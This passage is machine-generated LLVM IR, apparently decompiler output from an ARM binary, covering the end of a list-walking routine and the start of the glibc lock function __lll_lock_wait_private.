  %v2_18d6c = load i32, i32* %v1_18d6c, align 4
  store i32 %v2_18d6c, i32* %r3.global-to-local, align 4
  %v3_18d70 = icmp uge i32 %v2_18d6c, %v1_18d70.pre
  store i1 %v3_18d70, i1* %cpsr_c.global-to-local, align 1
  %v9_18d70 = icmp eq i32 %v2_18d6c, %v1_18d70.pre
  br i1 %v9_18d70, label %dec_label_pc_18d78, label %dec_label_pc_18d90

dec_label_pc_18d8c:                               ; preds = %dec_label_pc_18d78
  %v0_18d8c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_18d8c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18d90

dec_label_pc_18d90:                               ; preds = %dec_label_pc_18d5c, %dec_label_pc_18d78.dec_label_pc_18d6c_crit_edge, %dec_label_pc_18d8c
  %v0_18d90 = phi i32 [ %v0_18d8c, %dec_label_pc_18d8c ], [ %v2_18d6c120, %dec_label_pc_18d5c ], [ %v2_18d6c, %dec_label_pc_18d78.dec_label_pc_18d6c_crit_edge ]
  %v1_18d90 = phi i32 [ %v0_18d8c, %dec_label_pc_18d8c ], [ %v3_18d5c, %dec_label_pc_18d5c ], [ %v1_18d70.pre, %dec_label_pc_18d78.dec_label_pc_18d6c_crit_edge ]
  %v3_18d90 = icmp uge i32 %v0_18d90, %v1_18d90
  store i1 %v3_18d90, i1* %cpsr_c.global-to-local, align 1
  %v9_18d90 = icmp eq i32 %v0_18d90, %v1_18d90
  store i32 %v2_18d38, i32* %r4.global-to-local, align 4
  br i1 %v9_18d90, label %dec_label_pc_18d28, label %dec_label_pc_18d90.dec_label_pc_18d5c_crit_edge

dec_label_pc_18d90.dec_label_pc_18d5c_crit_edge:  ; preds = %dec_label_pc_18d90
  %v0_18d5c.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_18d60.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18d5c

dec_label_pc_18dac:                               ; preds = %dec_label_pc_18da0.backedge, %entry
  %v0_18db431 = phi i32 [ ptrtoint (i32* @global_var_32024.1324 to i32), %entry ], [ %v0_18da0, %dec_label_pc_18da0.backedge ]
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18db0

dec_label_pc_18db0.loopexit:                      ; preds = %bb72
  store i32 %v2_18d38, i32* %r6.global-to-local, align 4
  %v0_18db4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_18db0

dec_label_pc_18db0:                               ; preds = %dec_label_pc_18db0.loopexit, %dec_label_pc_18dac
  %v0_18db4 = phi i32 [ %v0_18db4.pre, %dec_label_pc_18db0.loopexit ], [ %v0_18db431, %dec_label_pc_18dac ]
  store i32 168, i32* %r3.global-to-local, align 4
  %v2_18db4 = add i32 %v0_18db4, 168
  %v3_18db4 = inttoptr i32 %v2_18db4 to i32*
  %v4_18db4 = load i32, i32* %v3_18db4, align 4
  store i32 %v4_18db4, i32* %r7.global-to-local, align 4
  %v0_18db8 = call i32 @__aeabi_read_tp()
  store i32 %v0_18db8, i32* %r0.global-to-local, align 4
  %v1_18dbc = add i32 %v4_18db4, 8
  %v2_18dbc = inttoptr i32 %v1_18dbc to i32*
  %v3_18dbc = load i32, i32* %v2_18dbc, align 4
  store i32 %v3_18dbc, i32* %r3.global-to-local, align 4
  %v1_18dc0 = add i32 %v0_18db8, -1168
  store i32 %v1_18dc0, i32* %r5.global-to-local, align 4
  %v3_18dc4 = icmp uge i32 %v3_18dbc, %v1_18dc0
  store i1 %v3_18dc4, i1* %cpsr_c.global-to-local, align 1
  %v9_18dc4 = icmp eq i32 %v3_18dbc, %v1_18dc0
  br i1 %v9_18dc4, label %dec_label_pc_18f2c, label %dec_label_pc_18dcc

dec_label_pc_18dcc:                               ; preds = %dec_label_pc_18db0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_18db4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_18dd8112 = inttoptr i32 %v4_18db4 to i32*
  %v2_18dd8113 = load i32, i32* %v1_18dd8112, align 4
  store i32 %v2_18dd8113, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_18ddc115 = icmp eq i32 %v2_18dd8113, 0
  br i1 %v9_18ddc115, label %dec_label_pc_18de4, label %dec_label_pc_18dfc

dec_label_pc_18de4:                               ; preds = %dec_label_pc_18dcc, %dec_label_pc_18de4.dec_label_pc_18dd8_crit_edge
  %v0_18de4116 = phi i32 [ %v1_18ddc.pre, %dec_label_pc_18de4.dec_label_pc_18dd8_crit_edge ], [ 0, %dec_label_pc_18dcc ]
  store i32 %v0_18de4116, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_18df4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_18df4, label %dec_label_pc_18df8, label %dec_label_pc_18de4.dec_label_pc_18dd8_crit_edge

dec_label_pc_18de4.dec_label_pc_18dd8_crit_edge:  ; preds = %dec_label_pc_18de4
  %v0_18dd8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_18ddc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_18dd8 = inttoptr i32 %v0_18dd8.pre to i32*
  %v2_18dd8 = load i32, i32* %v1_18dd8, align 4
  store i32 %v2_18dd8, i32* %r3.global-to-local, align 4
  %v3_18ddc = icmp uge i32 %v2_18dd8, %v1_18ddc.pre
  store i1 %v3_18ddc, i1* %cpsr_c.global-to-local, align 1
  %v9_18ddc = icmp eq i32 %v2_18dd8, %v1_18ddc.pre
  br i1 %v9_18ddc, label %dec_label_pc_18de4, label %dec_label_pc_18dfc

dec_label_pc_18df8:                               ; preds = %dec_label_pc_18de4
  %v0_18df8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_18df8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18dfc

dec_label_pc_18dfc:                               ; preds = %dec_label_pc_18dcc, %dec_label_pc_18de4.dec_label_pc_18dd8_crit_edge, %dec_label_pc_18df8
  %v0_18dfc = phi i32 [ %v0_18df8, %dec_label_pc_18df8 ], [ %v2_18dd8113, %dec_label_pc_18dcc ], [ %v2_18dd8, %dec_label_pc_18de4.dec_label_pc_18dd8_crit_edge ]
  %v1_18dfc = phi i32 [ %v0_18df8, %dec_label_pc_18df8 ], [ 0, %dec_label_pc_18dcc ], [ %v1_18ddc.pre, %dec_label_pc_18de4.dec_label_pc_18dd8_crit_edge ]
  %v3_18dfc = icmp uge i32 %v0_18dfc, %v1_18dfc
  store i1 %v3_18dfc, i1* %cpsr_c.global-to-local, align 1
  %v9_18dfc = icmp eq i32 %v0_18dfc, %v1_18dfc
  br i1 %v9_18dfc, label %bb74, label %bb73

bb73:                                             ; preds = %dec_label_pc_18dfc
  %v1_18e00 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_18e00, i32* %r0.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %dec_label_pc_18dfc, %bb73
  %v1_18e04 = xor i1 %v9_18dfc, true
  call void @__pseudo_cond_branch(i1 %v1_18e04, i32 ptrtoint (i32* @global_var_1907c.1373 to i32))
  %v0_18e08 = load i32, i32* %r5.global-to-local, align 4
  %v1_18e08 = load i32, i32* %r7.global-to-local, align 4
  %v2_18e08 = add i32 %v1_18e08, 8
  %v3_18e08 = inttoptr i32 %v2_18e08 to i32*
  store i32 %v0_18e08, i32* %v3_18e08, align 4
  br label %dec_label_pc_18f2c

dec_label_pc_18f2c:                               ; preds = %bb74, %dec_label_pc_18db0
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_18e10 = load i32, i32* %r8.global-to-local, align 4
  %v2_18e10 = add i32 %v0_18e10, 168
  %v3_18e10 = inttoptr i32 %v2_18e10 to i32*
  %v4_18e10 = load i32, i32* %v3_18e10, align 4
  store i32 %v4_18e10, i32* %r2.global-to-local, align 4
  %v1_18e14 = add i32 %v4_18e10, 4
  %v2_18e14 = inttoptr i32 %v1_18e14 to i32*
  %v3_18e14 = load i32, i32* %v2_18e14, align 4
  %v1_18e18 = add i32 %v3_18e14, 1
  store i32 %v1_18e18, i32* %r3.global-to-local, align 4
  store i32 %v1_18e18, i32* %v2_18e14, align 4
  %v0_18e20 = load i32, i32* %r5.global-to-local, align 4
  %v1_18e20 = add i32 %v0_18e20, 108
  %v2_18e20 = inttoptr i32 %v1_18e20 to i32*
  %v3_18e20 = load i32, i32* %v2_18e20, align 4
  store i32 %v3_18e20, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_18e28 = sub i32 0, %v3_18e20
  store i32 %v1_18e28, i32* %v2_18e20, align 4
  store i32 18874385, i32* %r0.global-to-local, align 4
  %v0_18e3c = load i32, i32* %r5.global-to-local, align 4
  %v1_18e3c = add i32 %v0_18e3c, 104
  store i32 %v1_18e3c, i32* %r4.global-to-local, align 4
  store i32 120, i32* %r7.global-to-local, align 4
  store i32 18874385, i32* @r2, align 4
  store i32 18874385, i32* %sb.global-to-local, align 4
  %v0_18f30.pre = load i32, i32* %sl.global-to-local, align 4
  store i32 168, i32* %r3.global-to-local, align 4
  %v2_18f30 = add i32 %v0_18e3c, 108
  %v3_18f30 = inttoptr i32 %v2_18f30 to i32*
  store i32 %v0_18f30.pre, i32* %v3_18f30, align 4
  %v0_18f34 = load i32, i32* %r8.global-to-local, align 4
  %v1_18f34 = load i32, i32* %r3.global-to-local, align 4
  %v2_18f34 = add i32 %v1_18f34, %v0_18f34
  %v3_18f34 = inttoptr i32 %v2_18f34 to i32*
  %v4_18f34 = load i32, i32* %v3_18f34, align 4
  store i32 %v4_18f34, i32* %r0.global-to-local, align 4
  %v1_18f38 = add i32 %v4_18f34, 4
  %v2_18f38 = inttoptr i32 %v1_18f38 to i32*
  %v3_18f38 = load i32, i32* %v2_18f38, align 4
  %v1_18f3c = add i32 %v3_18f38, -1
  store i32 %v1_18f3c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18f40 = icmp eq i32 %v1_18f3c, 0
  store i32 %v1_18f3c, i32* %v2_18f38, align 4
  br i1 %v2_18f40, label %dec_label_pc_18f4c, label %dec_label_pc_1903cthread-pre-split

dec_label_pc_18f4c:                               ; preds = %dec_label_pc_18f2c
  %v0_18f4c = load i32, i32* %r3.global-to-local, align 4
  %v1_18f4c = load i32, i32* %r0.global-to-local, align 4
  %v2_18f4c = add i32 %v1_18f4c, 8
  %v3_18f4c = inttoptr i32 %v2_18f4c to i32*
  store i32 %v0_18f4c, i32* %v3_18f4c, align 4
  %v0_18f50 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_18f50, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_18f54

dec_label_pc_18f54:                               ; preds = %dec_label_pc_18f84.dec_label_pc_18f54_crit_edge, %dec_label_pc_18f4c
  %v0_18f54 = phi i32 [ %v0_18f54.pre, %dec_label_pc_18f84.dec_label_pc_18f54_crit_edge ], [ %v0_18f50, %dec_label_pc_18f4c ]
  %v1_18f54 = inttoptr i32 %v0_18f54 to i32*
  %v2_18f54 = load i32, i32* %v1_18f54, align 4
  store i32 %v2_18f54, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_18f54, i32* @r2, align 4
  %v2_18f60100 = load i32, i32* %v1_18f54, align 4
  store i32 %v2_18f60100, i32* %r3.global-to-local, align 4
  %v3_18f64102 = icmp uge i32 %v2_18f60100, %v2_18f54
  store i1 %v3_18f64102, i1* %cpsr_c.global-to-local, align 1
  %v9_18f64108 = icmp eq i32 %v2_18f60100, %v2_18f54
  br i1 %v9_18f64108, label %dec_label_pc_18f6c, label %dec_label_pc_18f84

dec_label_pc_18f6c:                               ; preds = %dec_label_pc_18f54, %dec_label_pc_18f6c.dec_label_pc_18f60_crit_edge
  %v0_18f6c109 = phi i32 [ %v1_18f64.pre, %dec_label_pc_18f6c.dec_label_pc_18f60_crit_edge ], [ %v2_18f54, %dec_label_pc_18f54 ]
  store i32 %v0_18f6c109, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_18f7c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_18f7c, label %dec_label_pc_18f80, label %dec_label_pc_18f6c.dec_label_pc_18f60_crit_edge

dec_label_pc_18f6c.dec_label_pc_18f60_crit_edge:  ; preds = %dec_label_pc_18f6c
  %v0_18f60.pre = load i32, i32* @r2, align 4
  %v1_18f64.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_18f60 = inttoptr i32 %v0_18f60.pre to i32*
  %v2_18f60 = load i32, i32* %v1_18f60, align 4
  store i32 %v2_18f60, i32* %r3.global-to-local, align 4
  %v3_18f64 = icmp uge i32 %v2_18f60, %v1_18f64.pre
  store i1 %v3_18f64, i1* %cpsr_c.global-to-local, align 1
  %v9_18f64 = icmp eq i32 %v2_18f60, %v1_18f64.pre
  br i1 %v9_18f64, label %dec_label_pc_18f6c, label %dec_label_pc_18f84

dec_label_pc_18f80:                               ; preds = %dec_label_pc_18f6c
  %v0_18f80 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_18f80, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18f84

dec_label_pc_18f84:                               ; preds = %dec_label_pc_18f54, %dec_label_pc_18f6c.dec_label_pc_18f60_crit_edge, %dec_label_pc_18f80
  %v0_18f8c = phi i32 [ %v0_18f80, %dec_label_pc_18f80 ], [ %v2_18f60100, %dec_label_pc_18f54 ], [ %v2_18f60, %dec_label_pc_18f6c.dec_label_pc_18f60_crit_edge ]
  %v1_18f84 = phi i32 [ %v0_18f80, %dec_label_pc_18f80 ], [ %v2_18f54, %dec_label_pc_18f54 ], [ %v1_18f64.pre, %dec_label_pc_18f6c.dec_label_pc_18f60_crit_edge ]
  %v3_18f84 = icmp uge i32 %v0_18f8c, %v1_18f84
  store i1 %v3_18f84, i1* %cpsr_c.global-to-local, align 1
  %v9_18f84 = icmp eq i32 %v0_18f8c, %v1_18f84
  br i1 %v9_18f84, label %dec_label_pc_18f8c, label %dec_label_pc_18f84.dec_label_pc_18f54_crit_edge

dec_label_pc_18f84.dec_label_pc_18f54_crit_edge:  ; preds = %dec_label_pc_18f84
  %v0_18f54.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_18f54

dec_label_pc_18f8c:                               ; preds = %dec_label_pc_18f84
  %v2_18f8c = icmp ne i32 %v1_18f84, 0
  store i1 %v2_18f8c, i1* %cpsr_c.global-to-local, align 1
  %v7_18f90 = icmp slt i32 %v1_18f84, 2
  br i1 %v7_18f90, label %dec_label_pc_1903cthread-pre-split, label %dec_label_pc_18f94

dec_label_pc_18f94:                               ; preds = %dec_label_pc_18f8c
  %v0_18f94 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_18f94, i32* %r0.global-to-local, align 4
  %v0_18f98 = load i32, i32* %r1.global-to-local, align 4
  %v1_18f98 = add i32 %v0_18f98, 129
  store i32 %v1_18f98, i32* %r1.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1903cthread-pre-split

dec_label_pc_18fb0:                               ; preds = %dec_label_pc_1903cthread-pre-split, %dec_label_pc_19038
  %v0_18fb0 = phi i32 [ %v3_19038, %dec_label_pc_19038 ], [ %v0_1903c.pr, %dec_label_pc_1903cthread-pre-split ]
  %v1_18fb0 = inttoptr i32 %v0_18fb0 to i32*
  %v2_18fb0 = load i32, i32* %v1_18fb0, align 4
  store i32 %v2_18fb0, i32* %r3.global-to-local, align 4
  %v1_18fb4 = add i32 %v2_18fb0, 8
  %v2_18fb4 = inttoptr i32 %v1_18fb4 to i32*
  %v3_18fb4 = load i32, i32* %v2_18fb4, align 4
  store i32 %v3_18fb4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18fb8 = icmp eq i32 %v3_18fb4, 0
  br i1 %v2_18fb8, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_18fb0
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_18fb0, %bb75
  %v2_18fc0 = xor i1 %v2_18fb8, true
  call void @__pseudo_cond_branch(i1 %v2_18fc0, i32 %v3_18fb4)
  %v0_18fc4 = load i32, i32* %r6.global-to-local, align 4
  %v1_18fc4 = inttoptr i32 %v0_18fc4 to i32*
  %v2_18fc4 = load i32, i32* %v1_18fc4, align 4
  store i32 %v2_18fc4, i32* %r5.global-to-local, align 4
  %v1_18fc8 = add i32 %v2_18fc4, 20
  store i32 %v1_18fc8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_18fcc

dec_label_pc_18fcc:                               ; preds = %dec_label_pc_19000.dec_label_pc_18fcc_crit_edge, %bb76
  %v0_18fd0 = phi i32 [ %v0_18fd0.pre, %dec_label_pc_19000.dec_label_pc_18fcc_crit_edge ], [ %v1_18fc8, %bb76 ]
  %v0_18fcc = phi i32 [ %v0_18fcc.pre, %dec_label_pc_19000.dec_label_pc_18fcc_crit_edge ], [ %v2_18fc4, %bb76 ]
  %v1_18fcc = add i32 %v0_18fcc, 20
  %v2_18fcc = inttoptr i32 %v1_18fcc to i32*
  %v3_18fcc = load i32, i32* %v2_18fcc, align 4
  store i32 %v0_18fd0, i32* %r2.global-to-local, align 4
  store i32 %v3_18fcc, i32* %r4.global-to-local, align 4
  %v1_18fd8 = add i32 %v3_18fcc, -1
  store i32 %v1_18fd8, i32* %r1.global-to-local, align 4
  %v1_18fdc87 = inttoptr i32 %v0_18fd0 to i32*
  %v2_18fdc88 = load i32, i32* %v1_18fdc87, align 4
  store i32 %v2_18fdc88, i32* %r3.global-to-local, align 4
  %v3_18fe090 = icmp uge i32 %v2_18fdc88, %v3_18fcc
  store i1 %v3_18fe090, i1* %cpsr_c.global-to-local, align 1
  %v9_18fe096 = icmp eq i32 %v2_18fdc88, %v3_18fcc
  br i1 %v9_18fe096, label %dec_label_pc_18fe8, label %dec_label_pc_19000

dec_label_pc_18fe8:                               ; preds = %dec_label_pc_18fcc, %dec_label_pc_18fe8.dec_label_pc_18fdc_crit_edge
  %v0_18fe897 = phi i32 [ %v1_18fe0.pre, %dec_label_pc_18fe8.dec_label_pc_18fdc_crit_edge ], [ %v3_18fcc, %dec_label_pc_18fcc ]
  store i32 %v0_18fe897, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_18ff8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_18ff8, label %dec_label_pc_18ffc, label %dec_label_pc_18fe8.dec_label_pc_18fdc_crit_edge

dec_label_pc_18fe8.dec_label_pc_18fdc_crit_edge:  ; preds = %dec_label_pc_18fe8
  %v0_18fdc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_18fe0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_18fdc = inttoptr i32 %v0_18fdc.pre to i32*
  %v2_18fdc = load i32, i32* %v1_18fdc, align 4
  store i32 %v2_18fdc, i32* %r3.global-to-local, align 4
  %v3_18fe0 = icmp uge i32 %v2_18fdc, %v1_18fe0.pre
  store i1 %v3_18fe0, i1* %cpsr_c.global-to-local, align 1
  %v9_18fe0 = icmp eq i32 %v2_18fdc, %v1_18fe0.pre
  br i1 %v9_18fe0, label %dec_label_pc_18fe8, label %dec_label_pc_19000

dec_label_pc_18ffc:                               ; preds = %dec_label_pc_18fe8
  %v0_18ffc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_18ffc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_19000

dec_label_pc_19000:                               ; preds = %dec_label_pc_18fcc, %dec_label_pc_18fe8.dec_label_pc_18fdc_crit_edge, %dec_label_pc_18ffc
  %v0_1900c = phi i32 [ %v0_18ffc, %dec_label_pc_18ffc ], [ %v2_18fdc88, %dec_label_pc_18fcc ], [ %v2_18fdc, %dec_label_pc_18fe8.dec_label_pc_18fdc_crit_edge ]
  %v1_19000 = phi i32 [ %v0_18ffc, %dec_label_pc_18ffc ], [ %v3_18fcc, %dec_label_pc_18fcc ], [ %v1_18fe0.pre, %dec_label_pc_18fe8.dec_label_pc_18fdc_crit_edge ]
  %v3_19000 = icmp uge i32 %v0_1900c, %v1_19000
  store i1 %v3_19000, i1* %cpsr_c.global-to-local, align 1
  %v9_19000 = icmp eq i32 %v0_1900c, %v1_19000
  store i32 %v0_1900c, i32* @r2, align 4
  br i1 %v9_19000, label %dec_label_pc_1900c, label %dec_label_pc_19000.dec_label_pc_18fcc_crit_edge

dec_label_pc_19000.dec_label_pc_18fcc_crit_edge:  ; preds = %dec_label_pc_19000
  %v0_18fcc.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_18fd0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_18fcc

dec_label_pc_1900c:                               ; preds = %dec_label_pc_19000
  %v2_1900c = icmp ne i32 %v1_19000, 0
  store i1 %v2_1900c, i1* %cpsr_c.global-to-local, align 1
  %v7_1900c = icmp eq i32 %v1_19000, 1
  %v0_19014 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v7_1900c, label %dec_label_pc_19014, label %dec_label_pc_19038

dec_label_pc_19014:                               ; preds = %dec_label_pc_1900c
  %v1_19014 = inttoptr i32 %v0_19014 to i32*
  %v2_19014 = load i32, i32* %v1_19014, align 4
  store i32 %v2_19014, i32* %r1.global-to-local, align 4
  %v1_19018 = add i32 %v2_19014, 24
  %v2_19018 = inttoptr i32 %v1_19018 to i32*
  %v3_19018 = load i32, i32* %v2_19018, align 4
  store i32 %v3_19018, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1901c = icmp eq i32 %v3_19018, 0
  br i1 %v2_1901c, label %dec_label_pc_19038, label %dec_label_pc_19024

dec_label_pc_19024:                               ; preds = %dec_label_pc_19014
  %v1_19024 = add i32 %v2_19014, 20
  %v2_19024 = inttoptr i32 %v1_19024 to i32*
  %v3_19024 = load i32, i32* %v2_19024, align 4
  store i32 %v3_19024, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_19038

dec_label_pc_19038:                               ; preds = %dec_label_pc_1900c, %dec_label_pc_19024, %dec_label_pc_19014
  %v1_19038 = add i32 %v0_19014, 4
  %v2_19038 = inttoptr i32 %v1_19038 to i32*
  %v3_19038 = load i32, i32* %v2_19038, align 4
  store i32 %v3_19038, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1903c = icmp eq i32 %v3_19038, 0
  br i1 %v2_1903c, label %dec_label_pc_19044, label %dec_label_pc_18fb0

dec_label_pc_1903cthread-pre-split:               ; preds = %dec_label_pc_18f94, %dec_label_pc_18f8c, %dec_label_pc_18f2c
  %v0_1903c.pr = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1903c11 = icmp eq i32 %v0_1903c.pr, 0
  br i1 %v2_1903c11, label %dec_label_pc_19044, label %dec_label_pc_18fb0

dec_label_pc_19044:                               ; preds = %dec_label_pc_19038, %dec_label_pc_1903cthread-pre-split
  %v0_19044.pre = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_19044.pre, i32* %r0.global-to-local, align 4
  ret i32 %v0_19044.pre

; uselistorder directives
  uselistorder i32 %v0_1903c.pr, { 1, 0 }
  uselistorder i32 %v3_19038, { 1, 2, 0 }
  uselistorder i32 %v1_19000, { 1, 0, 2, 3 }
  uselistorder i32 %v0_18ffc, { 1, 0, 2 }
  uselistorder i32 %v1_18fe0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_18f80, { 1, 0, 2 }
  uselistorder i32 %v1_18f64.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_18f54, { 1, 0 }
  uselistorder i32 %v0_18df8, { 1, 0, 2 }
  uselistorder i32 %v1_18ddc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_18db4, { 2, 1, 0, 3 }
  uselistorder i32 %v0_18d8c, { 1, 0, 2 }
  uselistorder i32 %v1_18d70.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_18d38, { 1, 0, 2 }
  uselistorder i32 %v0_18d18, { 1, 0, 2 }
  uselistorder i32 %v1_18cfc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v3_18cdc, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 11, 12, 10, 13, 14 }
  uselistorder i32* %r6.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5, 6, 8, 7, 9, 10, 12, 11, 13, 14, 16, 15, 17 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 7, 9, 8, 0, 10, 11, 12, 13, 15, 14, 1, 16, 17, 18, 19, 20, 21, 22, 24, 23, 2, 25, 26, 27, 29, 28, 3, 30, 31, 33, 32, 4, 34 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 12, 6, 7, 8, 10, 9, 1, 11, 13, 14, 16, 15, 2, 17, 18, 20, 19, 3, 21, 22, 24, 23, 4, 25, 26, 27, 29, 28, 5, 31, 30, 32 }
  uselistorder label %dec_label_pc_19044, { 1, 0 }
  uselistorder label %dec_label_pc_19038, { 1, 2, 0 }
  uselistorder label %dec_label_pc_19000, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18fe8, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %dec_label_pc_18f84, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18f6c, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_18dfc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18de4, { 1, 0 }
  uselistorder label %dec_label_pc_18d90, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18d78, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_18d1c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18d04, { 1, 0 }
  uselistorder label %dec_label_pc_18da0.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_18cd0, { 1, 0 }
}

define i32 @__lll_lock_wait_private(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1907c = load i32, i32* @r4, align 4
  store i32 %v3_1907c, i32* %stack_var_-16, align 4
  %v0_19080 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_19080, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_19084

dec_label_pc_19084:                               ; preds = %dec_label_pc_19104.dec_label_pc_19084_crit_edge, %entry
  %v0_19088 = phi i32 [ %v0_19088.pre, %dec_label_pc_19104.dec_label_pc_19084_crit_edge ], [ %v0_19080, %entry ]
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_19088, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  %v1_1909017 = inttoptr i32 %v0_19088 to i32*
  %v2_1909018 = load i32, i32* %v1_1909017, align 4
  %v3_1909420 = icmp ne i32 %v2_1909018, 0
  store i1 %v3_1909420, i1* %cpsr_c.global-to-local, align 1
  %v9_1909426 = icmp eq i32 %v2_1909018, 1
  br i1 %v9_1909426, label %dec_label_pc_1909c, label %dec_label_pc_190b4

dec_label_pc_1909c:                               ; preds = %dec_label_pc_19084, %dec_label_pc_1909c.dec_label_pc_19090_crit_edge
  %v0_1909c27 = phi i32 [ %v1_19094.pre, %dec_label_pc_1909c.dec_label_pc_19090_crit_edge ], [ 1, %dec_label_pc_19084 ]
  store i32 %v0_1909c27, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_190ac = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_190ac, label %dec_label_pc_190b0, label %dec_label_pc_1909c.dec_label_pc_19090_crit_edge

dec_label_pc_1909c.dec_label_pc_19090_crit_edge:  ; preds = %dec_label_pc_1909c
  %v0_19090.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_19094.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_19090 = inttoptr i32 %v0_19090.pre to i32*
  %v2_19090 = load i32, i32* %v1_19090, align 4
  %v3_19094 = icmp uge i32 %v2_19090, %v1_19094.pre
  store i1 %v3_19094, i1* %cpsr_c.global-to-local, align 1
  %v9_19094 = icmp eq i32 %v2_19090, %v1_19094.pre
  br i1 %v9_19094, label %dec_label_pc_1909c, label %dec_label_pc_190b4

dec_label_pc_190b0:                               ; preds = %dec_label_pc_1909c
  %v0_190b0 = load i32, i32* %r4.global-to-local, align 4
